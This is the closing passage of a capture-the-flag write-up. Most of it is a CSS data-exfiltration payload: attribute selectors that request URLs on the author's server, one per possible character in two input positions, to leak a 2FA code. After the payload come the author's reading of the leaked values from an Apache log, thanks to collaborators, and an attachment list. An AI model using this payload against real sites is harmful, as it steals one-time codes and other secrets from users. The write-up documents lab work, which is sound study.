input[value=r]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=r"); }
input[value=s]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=s"); }
input[value=t]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=t"); }
input[value=u]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=u"); }
input[value=v]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=v"); }
input[value=w]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=w"); }
input[value=x]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=x"); }
input[value=y]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=y"); }
input[value=z]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=z"); }
input[value=0]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=0"); }
input[value=1]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=1"); }
input[value=2]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=2"); }
input[value=3]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=3"); }
input[value=4]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=4"); }
input[value=5]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=5"); }
input[value=6]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=6"); }
input[value=7]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=7"); }
input[value=8]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=8"); }
input[value=9]:nth-of-type(6) { background-image: url("https://mywebserver.com/data?6=9"); }

input[value=A]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=A"); }
input[value=B]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=B"); }
input[value=C]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=C"); }
input[value=D]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=D"); }
input[value=E]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=E"); }
input[value=F]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=F"); }
input[value=G]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=G"); }
input[value=H]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=H"); }
input[value=I]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=I"); }
input[value=J]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=J"); }
input[value=K]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=K"); }
input[value=L]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=L"); }
input[value=M]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=M"); }
input[value=N]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=N"); }
input[value=O]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=O"); }
input[value=P]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=P"); }
input[value=Q]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=Q"); }
input[value=R]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=R"); }
input[value=S]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=S"); }
input[value=T]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=T"); }
input[value=U]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=U"); }
input[value=V]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=V"); }
input[value=W]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=W"); }
input[value=X]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=X"); }
input[value=Y]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=Y"); }
input[value=Z]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=Z"); }
input[value=a]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=a"); }
input[value=b]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=b"); }
input[value=c]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=c"); }
input[value=d]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=d"); }
input[value=e]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=e"); }
input[value=f]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=f"); }
input[value=g]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=g"); }
input[value=h]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=h"); }
input[value=i]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=i"); }
input[value=j]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=j"); }
input[value=k]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=k"); }
input[value=l]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=l"); }
input[value=m]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=m"); }
input[value=n]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=n"); }
input[value=o]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=o"); }
input[value=p]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=p"); }
input[value=q]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=q"); }
input[value=r]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=r"); }
input[value=s]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=s"); }
input[value=t]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=t"); }
input[value=u]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=u"); }
input[value=v]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=v"); }
input[value=w]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=w"); }
input[value=x]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=x"); }
input[value=y]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=y"); }
input[value=z]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=z"); }
input[value=0]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=0"); }
input[value=1]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=1"); }
input[value=2]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=2"); }
input[value=3]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=3"); }
input[value=4]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=4"); }
input[value=5]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=5"); }
input[value=6]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=6"); }
input[value=7]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=7"); }
input[value=8]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=8"); }
input[value=9]:nth-of-type(7) { background-image: url("https://mywebserver.com/data?7=9"); }
```

Then looking at my **Apache access.log** I found all the valid codes!

{F856479}

Then by finally inserting all the code characters in the right position I reached the end of CTF!

{F856490}

*Ad maiora...*



## A note about collaboration & community
Apart from solving the CTF, my main goal on entering the Bug Bounty space (and also other different type of spaces) was to connect with people, make friends and have great collaborations.
This CTF has been great for all these aspects.

I would really like to thank you the following people:
- @mik317 for his invaluable support on the second-last step and for all the help he has been given to me during these months. This guy totally rocks.
- @nukedx for his astounding knowledge and will to help everyone.
- @al-madjus for having shared with me the last struggles of this CTF. I hope this will be an important collaboration also for the future.
- @d0nut for his essential article about CSS data exfiltration.

# THAT'S ALL FOLKS!

## Impact

Well, in this case the security impact is none as I helped all the hackers to be payed for all the bugs found in May!

Yeah, to do this I had to exploit several security issues, but that's another story... :D

## Attachments
- tweet.png
- ctf_creators.png
- login_forms.png
- api_site.png
- software_site.png
- 2fa_1.png
- md5.png
- brian_oliver.png
- api_response.png
- burp_1.png
- burp_2.png
- partone_activity.png
- crackstation.png
- logcat.png
- tweet_1.png
- tweet_hint.png
- staff_id.jpg
- staff_sandra.png
- sendreport_selector.png
- staff_login_selector.png
- avatar_class_upgradeToAdmin.png
- template_multiarray.png
- upgradetoadmin_401.png
- admin_tab.png
- marten_credentials.png
- may_transactions.png
- marten_2fa.png
- css_exfiltration.png
- length.png
- ctf_completed.png
- Infografica.jpeg
